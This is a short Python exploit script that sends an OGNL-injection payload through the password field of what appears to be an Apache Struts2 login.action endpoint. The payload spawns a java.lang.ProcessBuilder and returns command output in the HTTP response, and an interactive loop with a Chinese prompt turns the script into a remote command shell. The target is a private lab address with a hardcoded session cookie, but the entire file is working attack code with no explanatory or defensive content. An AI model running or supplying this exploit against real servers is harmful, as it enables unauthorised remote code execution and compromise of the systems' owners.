import requests

def get_result(command):
    fordata = 'username=a&password=%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22' + command + '%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D'
    url = 'http://192.168.92.129:8080/login.action;jsessionid=FE634C4E585CDCCC02F5D1167E82E965'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; U; Android 4.2; xx-xx; GT-I9500 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '567',
        'Origin': 'http://192.168.92.129:8080',
        'Connection': 'close',
        'Referer': 'http://192.168.92.129:8080/',
        'Cookie': 'JSESSIONID=FE634C4E585CDCCC02F5D1167E82E965',
        'Upgrade-Insecure-Requests': '1',
    }
    response = requests.post(url=url, headers=headers, data=fordata)
    result = response.text.split('</tr>')[-1].strip()
    print(result)

while True:
    cmd = input('请输入命令,Q/q退出：')
    if cmd.upper() == 'Q':
        break
    get_result(cmd)
